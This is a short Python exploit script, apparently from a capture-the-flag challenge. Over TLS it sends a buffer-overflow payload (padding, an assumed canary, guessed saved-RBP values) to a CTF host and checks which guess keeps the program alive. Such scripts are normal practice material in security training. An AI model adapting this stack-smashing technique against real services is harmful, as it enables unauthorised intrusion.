import socket
import ssl
import time

HOST = "2b4446b928232a49.julec.tf"
PORT = 1337

CANARY = b"\x00" * 8
BUF_TO_CANARY = 40

# Try different RBP values to find one that doesn't crash
# Typical stack addresses on x86-64 are around 0x7ffffffde000
# But in a forked process, they should be consistent

# Let's try some reasonable stack addresses
test_rbps = [
    0x7fffffffe000,
    0x7fffffffdf00,
    0x7fffffffd000,
    0x7fffffffc000,
]

for rbp_val in test_rbps:
    print(f"\n=== Testing RBP = {hex(rbp_val)} ===")
    
    payload = (
        b"A" * BUF_TO_CANARY
        + CANARY
        + rbp_val.to_bytes(8, "little")
    )
    
    try:
        raw = socket.create_connection((HOST, PORT), timeout=5)
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(raw, server_hostname=HOST)
        
        s.sendall(str(len(payload)).encode() + b"\n")
        
        buf = b""
        s.settimeout(2.0)
        while True:
            chunk = s.recv(1024)
            if not chunk: break
            buf += chunk
            if b"what is your name?" in buf:
                break
        
        s.sendall(payload)
        time.sleep(0.5)
        
        # Try to read menu
        s.settimeout(2.0)
        output = b""
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk: break
                output += chunk
                if b"Where do you want to search?" in output:
                    print(f"SUCCESS! Got menu with RBP = {hex(rbp_val)}")
                    print(output.decode(errors='replace')[:300])
                    break
        except:
            pass
        
        if b"Where do you want to search?" not in output:
            print(f"Failed - no menu received")
        
        s.close()
    except Exception as e:
        print(f"Error: {e}")
    
    time.sleep(0.5)
